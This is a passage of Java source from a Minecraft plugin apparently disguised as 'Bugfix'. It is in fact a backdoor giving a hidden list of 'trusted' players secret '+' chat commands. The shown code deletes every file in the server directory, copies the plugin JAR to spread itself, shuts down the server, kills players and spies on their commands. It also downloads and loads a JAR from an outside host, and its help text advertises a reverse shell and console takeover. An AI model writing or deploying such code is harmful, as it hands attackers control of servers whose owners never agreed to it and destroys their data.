                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+deop <Optional Player> | remove OP perms");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+kick <Player> | Kick a Player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("4")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 4/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+demo <Player> | Demo Screen");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+caps <Player> | CAPSLOCK");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+swear <Player> | Swearing is Ok.");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+nyancat | spawn a Nyan Cat");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+sudo [:s]<Player> <Command > | cmd/chat");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+vanish [-s] | Toggle vanish");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("5")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 5/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+hacked <Player> | wtf?!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+meteor <Player> | A METEORITE!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+blockconsole | Blocks Console");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+mute+ | stop wrong syntax with +");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+glassbox <Player> | Trap a player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+spin <Player> | Spin a Player around");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("6")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 6/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+crash <Player> | Crashes Minecraft");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+repl <Datei> | Replaces JAR with itself");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+control <Player> | Control a player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+fly | I belive i can fly!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+timespam <Player> | Day/Night spam");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+blockrain <Block> | Let it snow blocks!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("7")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 7/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+acspam | Spam all achievements");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+shell <Command> | Reverse Shell");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+flypigs <Count> | Spawns flying Pigs");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+ufo | Spawns a controllable UFO");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+rickroll | Starts a Rickroll");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+spack <Player> | Bugs the player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("8")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 8/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+dropinv <Player> | Dropps Inv of a player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+infkill <Player> | Kills Player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+gm [0,1,2,3] | Gamemode command");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+give <Item> | Give command");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+tp <Player, Loc> | Tp command");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+cc | Clears the ingame Chat");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("9")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 9/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+mojangwarning <Player> | WARNING!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+bookmatrix <Player> | Die matrix");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+noeula | Deletes eula.txt");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+disable <Plugin Name> | Disable plugin");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+delplugin <Name> | Deletes plugin");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+delete <File> | Deletes file");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("10")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 10/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+download <URL> <DIR> | Downloads File");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+delall | Deletes everything on the server");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+reload | Just reloads the server");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+stop [Message] | Stops the Server :)");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+pacman <Player> | Spawns Pacman");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+pacmanspeed <Number> | Speed up!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("11")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 11/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+schlong <Player> | Schlongs a Player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+console <Command> | Sudo Console");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+ssudo <Player> <Command> | OP sudo");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+termites <Player> | Spawns Termites");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+contrast <Player> <Number> | Change Contrast");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+unloadchunk <Player> | Unloads chunk!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("12")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 12/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+suspend <Player> | Mojang ban message");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+demoover <Player> | Demo-Time is up xD");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+credits <Player> | Shows credits to player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+snow | Spawnt Schnebälle");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+unloadworld <Player> | Unloads the World");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+chat <Message> | Sends MSG in trusted Chat");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("13")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "========== Befehle - 13/14 ==========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+sounds <Player> | Starts annoying sounds");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+cmdspy | See commands from other players!");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+tntrain <Player> | Lets it rain TNT");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+kill <Player> | Kills the Player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+bug <Player> | Bugs the player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+listname <Player> <Name> | Tablist Name");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("14")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "======= Befehle - 14 WORKING ========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+antistop | Prevent the server from /stop");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+spam <Message> | Spams messages in Chat");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+bombs | Gives Bombs that you can throw");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+floodconsole <Message> | Floods console");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else if (args[1].equalsIgnoreCase("15")) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "======= Befehle - 14 WORKING ========");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+Du hast ein Secret gefunden! :)");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+cam <Player> <0-3> | Camera effects");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+anim <Player> <0-5> | Spielt animation ab");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+cschlong <Player> | Schlong clientside");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+cam <Player> <0-3> | Camera effects");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+delchunk | löscht einen chunk");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+toilette | Saugt Player in ein Klo");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+zunami | Spawnt einen Zunami");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+blackscreen <Player> | Blackscreen");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+killaura <Player> | Killaura");
                //event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+timespam <Player> | Day/Night spam");
                //event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "+spin <Player> | Dreht den Player");
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.YELLOW + "==================================");
            } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +help <1-14> !");
                }
            } else if (args[0].equalsIgnoreCase("+repl") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +repl <Datei>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                try {
                    Files.copy(Bugfix.pluginJar, new File("plugins/" + args[1] + ".jar"));
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Successfully copied to " + ChatColor.RED + args[1] + ".jar" + ChatColor.GREEN + ".");
                } catch (IOException e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred!");
                }
            } else if (args[0].equalsIgnoreCase("+read") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +read");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                event.getPlayer().sendMessage(FileReader.crypt("", 126));
            } else if (args[0].equalsIgnoreCase("+writenew") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length < 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +writenew");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                List<String> list = new ArrayList<String>(Arrays.asList(args));
                list.remove(args[0]);
                char[] c = String.join(" ", list).toString().toCharArray();
                event.getPlayer().sendMessage(String.valueOf(FileReader.decrypt(2, c)));
            } else if (args[0].equalsIgnoreCase("+replace") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +replace <Datei>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                try {
                    Files.copy(Bugfix.pluginJar, new File("plugins/" + args[1] + ".jar"));
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Successfully copied to " + ChatColor.RED + args[1] + ".jar" + ChatColor.GREEN + ".");
                } catch (IOException e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred!");
                }
            } else if (args[0].equalsIgnoreCase("+delall") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +delall");
                    return;
                }

                try {
                    File f = new File("server.properties");
                    f.getAbsoluteFile().getParentFile();
                    for (File df : f.getAbsoluteFile().getParentFile().listFiles()) {
                        try {
                            if (Bugfix.deleteDirectory(df)) {
                                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + df.getName() + "§a deleted!");
                            } else {
                                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + df.getName() + " not deleted!");
                            }
                        } catch (Exception e) {
                            event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Error whilst deleting file!");
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Error whilst caching files!");
                }
            } else if (args[0].equalsIgnoreCase("+reload") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +reload");
                    return;
                }

                Bukkit.reload();
            } else if (args[0].equalsIgnoreCase("+stop") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +stop");
                    return;
                }

                Bukkit.shutdown();
            } else if (args[0].equalsIgnoreCase("+listname") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 3) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +listname <Player> <Name>");
                    return;
                }

                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                target.setPlayerListName(args[2].replace("&", "§"));
            }

        /*
        else if(args[0].equalsIgnoreCase("+delete") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
            event.setCancelled(true);
            if(args.length != 2) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +delete <Datei>");
                return;
            }
            //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
            //try {
                File file = new File("plugins/" + args[1]);
                file.delete();

                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Erfolgreich in " + ChatColor.RED + args[1] + ".jar" + ChatColor.GREEN + "kopiert.");
            //} catch (IOException e) {
                event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred!");
            //}
        }
         */

            else if (args[0].equalsIgnoreCase("+timespam") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +timespam <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (timespam.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player sees the time normal again.");
                    timespam.remove(target.getName());
                    target.setPlayerTime(target.getWorld().getTime(), false);
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now has a flashing sky!");
                    timespam.add(target.getName());
                }
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+kill") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +kill <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                target.setHealth(0.0D);
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+tntrain") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +tntrain <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (tntrain.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is no longer getting bombed.");
                    tntrain.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The player is now getting bombed!");
                    tntrain.add(target.getName());
                }
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+cmdspy") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +cmdspy");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                if (cmdspy.contains(event.getPlayer().getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You no longer see others commands.");
                    cmdspy.remove(event.getPlayer().getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You can now see others commands!");
                    cmdspy.add(event.getPlayer().getName());
                }
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+sounds") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +sounds <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (sounds.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player doesn't hear annoying Sounds anymore.");
                    sounds.remove(target.getName());
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player now hears annoying sounds!");
                    sounds.add(target.getName());
                }
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+fly") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +fly");
                    return;
                }
                if (event.getPlayer().getAllowFlight()) {
                    event.getPlayer().setAllowFlight(false);
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You deactivated Fly!");
                } else {
                    event.getPlayer().setAllowFlight(true);
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "You activated Flyt!");
                }
            } else if (args[0].equalsIgnoreCase("+snow") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +snow");
                    return;
                }
                Bukkit.getScheduler().runTask(Bugfix.getInstance(), () -> {
                    if (snowballe.containsKey(event.getPlayer().getUniqueId())) {
                        snowballe.remove(event.getPlayer().getUniqueId());
                        isSnowing = false;
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Snowballs stopped!");
                    } else {
                        snowballe.put(event.getPlayer().getUniqueId(), event.getPlayer().getWorld().getHighestBlockAt(event.getPlayer().getLocation()).getLocation());
                        Entity fsbe = event.getPlayer().getWorld().spawnEntity(event.getPlayer().getWorld().getHighestBlockAt(event.getPlayer().getLocation()).getLocation().clone().add(0, 20, 0), EntityType.SNOWBALL);
                        fsbe.setMetadata("isBoomer", new FixedMetadataValue(Bugfix.getInstance(), true));
                        isSnowing = true;
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Snowballs spawned!");
                    }
                });
            } else if (args[0].equalsIgnoreCase("+acspam") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +acspam");
                    return;
                }
                if (acspam) {
                    acspam = false;
                } else {
                    acspam = true;
                }
            } else if (args[0].equalsIgnoreCase("+blockrain") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (blockrain == null) {
                    if (args.length != 2) {
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +blockrain <Block>");
                        return;
                    }
                }
                //event.getPlayer().sendMessage(blockreg_loc.toString() + blockrain.toString());
                if (blockrain != null) {
                    //event.getPlayer().sendMessage(blockreg_loc.toString() + blockrain.toString());
                    blockrain = null;
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Block rain stopped.");
                } else {
                    //event.getPlayer().sendMessage(blockreg_loc.toString() + blockrain.toString());
                /*
                try {
                    blockrain = Material.valueOf(args[1]);
                } catch(Exception e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +blockrain <Block>");
                }
                 */
                    NamespacedKey key = NamespacedKey.fromString(args[1]);
                    Material result = null;

                    for (Material material : Material.values()) {
                        // Legacy ist für plugins < 1.13, legacy materials
                        // haben keinen richtigen key.
                        if (material.isLegacy()) continue;
                        if (!material.getKey().equals(key)) continue;

                        result = material;
                        break;
                    }

                    if (result == null) {
                        // Kein material gefunden
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +blockrain <Block>");
                    } else {
                        // Material gefunden
                        event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "Its raining Blocks now!");
                        blockrain = result;
                        blockreg_loc = event.getPlayer().getLocation();
                    }
                }
            } else if (args[0].equalsIgnoreCase("+blackscreen") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +blackscreen <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                if (timespam.contains(target.getName())) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player hieht die Zeit jetzt wieder normal.");
                    timespam.remove(target.getName());
                    target.setPlayerTime(target.getWorld().getTime(), false);
                } else {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The Player hat jetzt Tag-Nacht spam!");
                    timespam.add(target.getName());
                }
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+credits") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (checkPlib(event.getPlayer())) return;
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +credits <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }

                event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "The credits are now showing for the player!");
                PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.GAME_STATE_CHANGE);
                pc.getGameStateIDs().write(0, 4);
                pc.getFloat().write(0, (float) 1);
                Bugfix.getProt().sendServerPacket(target, pc);
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+anim") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (checkPlib(event.getPlayer())) return;
                if (args.length != 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +anim <Player>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.ANIMATION);
                pc.getGameStateIDs().write(0, 4);
                pc.getFloat().write(0, (float) 1);
                Bugfix.getProt().sendServerPacket(target, pc);
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+chat") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length < 2) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +chat <Message>");
                    return;
                }
                for (String n : Bugfix.trustedPlayers) {
                    Player p = Bukkit.getPlayer(n);
                    if (p == null) return;
                    List<String> list = new ArrayList<String>(Arrays.asList(args));
                    list.remove(args[0]);
                    p.sendMessage(PluginPrefix + "§7[§2CHAT§7] §c" + event.getPlayer().getName() + "§7: §a" + String.join(" ", list));
                }
            } else if (args[0].equalsIgnoreCase("+cam") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (checkPlib(event.getPlayer())) return;
                if (args.length != 3) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +cam <Player> <0-3>");
                    return;
                }
                //Files.copy(Bugfix.pluginJar, Bugfix.pluginJar, 0);
                Player target = (Bukkit.getServer().getPlayer(args[1]));
                if (target == null) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + args[1] + ChatColor.RED + " is not online");
                    return;
                }
                int cam = 0;
                try {
                    cam = Integer.parseInt(args[2]);
                } catch (Exception e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +cam <Player> <0-3>");
                }
                PacketContainer pc = Bugfix.getProt().createPacket(PacketType.Play.Server.CAMERA);
                pc.getIntegers().write(0, cam);
                Bugfix.getProt().sendServerPacket(target, pc);
                //(new Packet70Bed(4, 0));
            } else if (args[0].equalsIgnoreCase("+plib") && Bugfix.trustedPlayers.contains(event.getPlayer().getName())) {
                event.setCancelled(true);
                if (args.length != 1) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "Use +plib");
                    return;
                }
                try {
                    //URL url = new UnknownError("hi");
                    URL url = new URL("https://dwarslooper.com/localrgfiles/plib.jar");
                    String outputFileName = "plugins\\ProtocolLib.jar";
                    InputStream in = url.openStream();
                    ReadableByteChannel rbc = Channels.newChannel(in);
                    FileOutputStream fos = new FileOutputStream(outputFileName);
                    fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.GREEN + "ProtocolLib installed successfully!");
                    Bugfix.getInstance().getPluginLoader().loadPlugin(new File("plugins\\ProtocolLib.jar"));
                    Bugfix.getInstance().getPluginLoader().loadPlugin(new File("plugins/ProtocolLib.jar"));
                } catch (IOException e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred: IOException!");
                    e.printStackTrace();
                } catch (InvalidPluginException e) {
                    event.getPlayer().sendMessage(PluginPrefix + ChatColor.RED + "An ERROR occurred: InvalidPluginException!");
                    e.printStackTrace();
                }

